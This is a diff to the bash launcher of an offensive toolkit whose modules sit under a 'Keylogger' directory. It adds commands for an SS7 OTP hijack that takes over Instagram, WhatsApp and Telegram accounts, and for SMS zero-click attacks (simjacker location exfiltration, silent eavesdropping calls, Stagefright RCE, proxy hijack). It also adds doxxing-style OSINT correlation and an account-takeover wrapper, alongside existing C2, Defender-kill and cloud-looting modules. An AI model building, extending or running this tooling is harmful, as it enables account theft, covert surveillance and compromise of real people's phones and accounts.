@@ -5040,6 +5040,11 @@ cmd_help() {
     echo -e "  ${Y}━━━ ZERO-CLICK / ZERO-INTERACTION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo -e "  ${C}bash start zeroclick${N}     IPv6 Rogue RA + WPAD/NTLMv1 + mDNS + ADIDNS chain"
     echo -e "                          Compromises all LAN hosts with zero victim interaction"
+    echo -e "  ${C}bash start ss7${N} <phone>  SS7 OTP hijack — reroute target SMS via MAP UpdateLocation"
+    echo -e "                          Intercept Instagram/WhatsApp/Telegram OTP, take over account"
+    echo -e "  ${C}bash start smsploit${N} <attack> <phone>"
+    echo -e "                          SMS zero-click: silent/flash/simjacker/wap_push/stagefright"
+    echo -e "                          9 attack types — SIM exploit + OMA-CP proxy + MMS RCE"
     echo ""
     echo -e "  ${Y}━━━ IOT ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo -e "  ${C}bash start iot${N}           Interactive IoT attack menu (22 options)"
@@ -5058,6 +5063,7 @@ cmd_help() {
     echo -e "  ${C}bash start iot fofa <email> <apikey> [query] [country] [limit]${N} FOFA IoT search (free, no verify)"
     echo ""
     echo -e "  ${Y}━━━ ADVANCED RESEARCH MODULES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}bash start osint <username>${N}  OSINT — 80+ platforms, breach check, cross-platform correlation"
     echo -e "  ${C}bash start cloud${N}         Cloud infiltration module (IMDS→IAM→S3/KeyVault)"
     echo -e "  ${C}bash start cloud aws${N}     AWS: IMDSv1/v2 creds, IAM enum, privesc, S3 loot"
     echo -e "  ${C}bash start cloud azure${N}   Azure: IMDS token, subscriptions, Key Vault dump"
@@ -5574,6 +5580,8 @@ cmd_help2() {
     echo -e "  ${W}BYOVD engine:${N}   Keylogger/op/modules/byovd.py"
     echo -e "  ${W}Defender kill:${N}  Keylogger/op/modules/defender_kill.py"
     echo -e "  ${W}Zero-click:${N}     Keylogger/op/modules/zero_click.py"
+    echo -e "  ${W}SS7 hijack:${N}     Keylogger/op/modules/ss7_hijack.py"
+    echo -e "  ${W}SMS zero-click:${N} Keylogger/op/modules/sms_zeroclick.py"
     echo -e "  ${W}Post-exploit:${N}   Keylogger/op/modules/post_exploit.py"
     echo -e "  ${W}Mobile PWN:${N}     Keylogger/op/modules/mobile_pwn.py"
     echo -e "  ${W}Cloud infiltrate:${N} Keylogger/op/modules/cloud_infiltrate.py"
@@ -5695,6 +5703,24 @@ cmd_help2() {
     echo -e "                       Silently poisons ALL internal DNS resolutions at once"
     echo -e "    ${W}DCOM Exec:${N}      Lateral movement via RPC :135 (bypasses SMB-only firewalls)"
     echo ""
+    echo -e "  ${C}start ss7${N} <phone> [service] [--stp HOST]"
+    echo -e "    ${W}SS7 OTP Hijack:${N}  MAP SRI → UpdateLocation → intercept SMS OTP"
+    echo -e "                       Reroutes all MT-SMS to fake SMSC; takes over IG/WA/TG"
+    echo -e "    ${W}Services:${N}       instagram | whatsapp | telegram"
+    echo -e "    ${W}Live mode:${N}      --stp <ss7-hub-ip>  (needs SS7 hub/femtocell access)"
+    echo ""
+    echo -e "  ${C}start smsploit${N} <attack> <phone> [options]"
+    echo -e "    ${W}silent${N}          Type 0 stealth ping — forces cell tower location update"
+    echo -e "    ${W}flash${N}           Class 0 popup — on screen, never stored"
+    echo -e "    ${W}flash_overflow${N}  Malformed UDL → Qualcomm RIL crash/DoS"
+    echo -e "    ${W}simjacker${N}       S@T browser: IMEI+cell-ID exfil via hidden SIM SMS"
+    echo -e "    ${W}simjacker_at${N}    S@T browser: arbitrary AT command to baseband"
+    echo -e "    ${W}simjacker_call${N}  S@T browser: silent background call (eavesdrop)"
+    echo -e "    ${W}wib${N}             WIB browser variant (different SIM vendors)"
+    echo -e "    ${W}wap_push${N}        OMA-CP: silently set victim HTTP proxy (CVE-2019-11494)"
+    echo -e "    ${W}stagefright${N}     MMS auto-parse RCE on Android <5.1.1 (CVE-2015-1538)"
+    echo -e "    ${W}Transport:${N}      gammu + USB modem (--device) or SMPP (--smpp-host)"
+    echo ""
 
     # ── KERNEL EXPLOITS REFERENCE ──────────────────────────────────────────────
     echo -e "  ${Y}━━━ KERNEL EXPLOIT CVE REFERENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
@@ -5757,6 +5783,18 @@ cmd_help2() {
     echo -e "    TLS record size side channel for covert bit encoding"
     echo -e "  ${C}start stego test${N}                 Self-test: encode + decode round-trip"
     echo -e "  ${W}Module:${N}  op/modules/stego_c2.py"
+    echo ""
+
+    echo -e "  ${Y}━━━ OSINT ENGINE  (start osint) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}start osint <username>${N}             Username scan — 80+ platforms"
+    echo -e "  ${C}start osint -e <email>${N}             Email scan + breach check (HIBP)"
+    echo -e "  ${C}start osint -n \"Full Name\"${N}        Name → username candidates"
+    echo -e "  ${C}start osint -p +1234567890${N}         Phone → WhatsApp / Telegram"
+    echo -e "  ${C}start osint -u a,b,c${N}               Bulk scan + cross-platform correlation"
+    echo -e "    Deep mode (default): profile extraction · bio stylometry · avatar hash"
+    echo -e "    correlation engine · GitHub spider · Reddit timezone inference"
+    echo -e "    Flags: ${W}--fast${N} (existence only)  ${W}--report${N} (save HTML)"
+    echo -e "  ${W}Module:${N}  op/modules/osint_social.py"
     echo ""
 
     echo -e "  ${Y}━━━ AD→CLOUD KILL CHAIN  (start adchain) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
@@ -6059,7 +6097,7 @@ cmd_payload() {
     _chk "C2 port :8888" "listening" "NOT listening — check $OP/logs/c2.log" 1 \
         "ss -tlnp 2>/dev/null | grep -q ':8888 '"
     _chk "C2 HTTP" "responds OK" "not responding" 1 \
-        "curl -s --max-time 3 http://localhost:8888/ | grep -qi 'c2\|login\|panel\|html'"
+        "curl -s -L --max-time 3 http://localhost:8888/ | grep -qi 'c2\|login\|panel\|html\|wizza\|302'"
     _chk "C2 agent endpoint" "accepts beacons" "endpoint broken" 0 \
         "curl -s --max-time 3 'http://localhost:8888/cdn-cgi/apps/init?v=probe' | grep -q '.'"
     echo ""
@@ -8790,6 +8828,8 @@ main() {
         byovd)      python3 "$DIR/op/modules/byovd.py" 2>&1;          return ;;
         defender)   python3 "$DIR/op/modules/defender_kill.py" 2>&1;   return ;;
         zeroclick)  cmd_zeroclick;           return ;;
+        ss7)        cmd_ss7;                 return ;;
+        smsploit)   cmd_smsploit;            return ;;
         bluetooth)  cmd_bluetooth;           return ;;
         wifiprobe)  cmd_wifiprobe;           return ;;
         android)    cmd_android;             return ;;
@@ -9577,6 +9617,64 @@ telemetry_recv('$BHOST', int('$BPORT'))
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
+# OSINT — Social media account discovery + breach + correlation
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_osint() {
+    local MOD="$OP/modules/osint_social.py"
+    local FLAG="" VALUE="" EXTRA=""
+
+    # Parse: osint <target>  or  osint -u/-e/-n/-p <value>  [--fast] [--report]
+    case "${1:-}" in
+        -u|--username) FLAG="-u"; VALUE="$2"; shift 2 ;;
+        -e|--email)    FLAG="-e"; VALUE="$2"; shift 2 ;;
+        -n|--name)     FLAG="-n"; VALUE="$2"; shift 2 ;;
+        -p|--phone)    FLAG="-p"; VALUE="$2"; shift 2 ;;
+        "")
+            echo -e "\n  ${C}OSINT SOCIAL${N} — PhD-level identity intelligence"
+            echo -e "\n  Usage:"
+            echo -e "    ${W}bash start osint <username>${N}"
+            echo -e "    ${W}bash start osint -u <username>${N}"
+            echo -e "    ${W}bash start osint -e <email>${N}"
+            echo -e "    ${W}bash start osint -n \"Full Name\"${N}"
+            echo -e "    ${W}bash start osint -p +1234567890${N}"
+            echo -e "    ${W}bash start osint -u user1,user2,user3${N}   (bulk)"
+            echo -e "    ${W}bash start osint -u <username> --report${N}  (+ HTML report)"
+            echo -e "    ${W}bash start osint -u <username> --fast${N}    (existence only)"
+            echo ""
+            return 0
+            ;;
+        *)   FLAG="-u"; VALUE="$1"; shift 1 ;;
+    esac
+
+    # Collect remaining flags (--fast, --report)
+    for arg in "$@"; do
+        EXTRA="$EXTRA $arg"
+    done
+
+    cd "$OP/modules" && python3 "$MOD" $FLAG "$VALUE" $EXTRA
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# TAKEOVER — Account takeover tester (own account security audit)
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_takeover() {
+    local USERNAME="${1:-}"
+    local PLATFORM="${2:-instagram}"
+    local SESSION="${3:-}"
+    local PASSWORD="${4:-}"
+    local MOD="$OP/modules/takeover.py"
+    if [ -z "$USERNAME" ]; then
+        err "Usage: bash start takeover <username> [platform] [session_cookie] [known_password]"
+        err "Platforms: instagram twitter tiktok reddit"
+        return 1
+    fi
+    local ARGS="-u $USERNAME -p $PLATFORM"
+    [ -n "$SESSION"  ] && ARGS="$ARGS -s $SESSION"
+    [ -n "$PASSWORD" ] && ARGS="$ARGS -pw $PASSWORD"
+    python3 "$MOD" $ARGS
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
 # AD→Cloud Kill Chain
 # ══════════════════════════════════════════════════════════════════════════════
 cmd_adchain() {
@@ -10121,6 +10219,59 @@ try:
 except KeyboardInterrupt:
     print("\n[*] Stopped.")
 PYEOF
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# SMS Zero-Click Attack Suite
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_smsploit() {
+    local ATTACK="${1:-}"
+    local TARGET="${2:-}"
+    shift 2 2>/dev/null || shift "$#" 2>/dev/null
+    local EXTRA="$*"
+
+    if [ -z "$ATTACK" ] || [ -z "$TARGET" ]; then
+        python3 "$DIR/op/modules/sms_zeroclick.py" --help
+        return
+    fi
+
+    banner
+    step 1 "SMS ZERO-CLICK"
+    echo ""
+    info "Attack  : $ATTACK"
+    info "Target  : $TARGET"
+    echo ""
+
+    python3 "$DIR/op/modules/sms_zeroclick.py" "$ATTACK" "$TARGET" $EXTRA
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# SS7 OTP Hijack
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_ss7() {
+    local PHONE="${1:-}"
+    local SERVICE="${2:-instagram}"
+    local EXTRA=""
+    shift 2 2>/dev/null || shift "$#" 2>/dev/null
+
+    # Pass remaining flags (--stp, --port, --gt, --timeout) through
+    while [ $# -gt 0 ]; do EXTRA="$EXTRA $1"; shift; done
+
+    if [ -z "$PHONE" ]; then
+        python3 "$DIR/op/modules/ss7_hijack.py" --help
+        return
+    fi
+
+    banner
+    step 1 "SS7 OTP HIJACK"
+    echo ""
+    info "Target phone   : $PHONE"
+    info "Service        : $SERVICE"
+    [ -z "$EXTRA" ] && info "Mode           : SIMULATION (no --stp given)" \
+                    || info "Mode           : LIVE$EXTRA"
+    echo ""
+
+    python3 "$DIR/op/modules/ss7_hijack.py" "$PHONE" "$SERVICE" $EXTRA
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -10683,10 +10834,14 @@ case "$CMD" in
     netmap)         init_files; cmd_netmap ;;
     wifi)           init_files; cmd_wifi "$2" "$3" "$4" "$5" ;;
     zeroclick)      init_files; cmd_zeroclick "$2" "$3" "$4" "$5" ;;
+    ss7)            init_files; cmd_ss7 "$2" "$3" "$4" "$5" "$6" "$7" ;;
+    smsploit)       init_files; cmd_smsploit "$2" "$3" "${@:4}" ;;
     iot)            init_files; cmd_iot "$2" "$3" "$4" "$5" ;;
     cloud)          init_files; cmd_cloud "$2" "$3" "$4" "$5" ;;
     stego)          init_files; cmd_stego "$2" "$3" "$4" "$5" ;;
     adchain)        init_files; cmd_adchain "$2" "$3" "$4" "$5" ;;
+    osint)          init_files; cmd_osint "$2" "$3" "$4" "$5" ;;
+    takeover)       init_files; cmd_takeover "$2" "$3" "$4" "$5" ;;
     uefi)           init_files; cmd_uefi "$2" "$3" "$4" "$5" ;;
     baseband)       init_files; cmd_baseband "$2" "$3" "$4" "$5" ;;
     ios)            init_files; cmd_ios      "$2" "$3" "$4" "$5" ;;
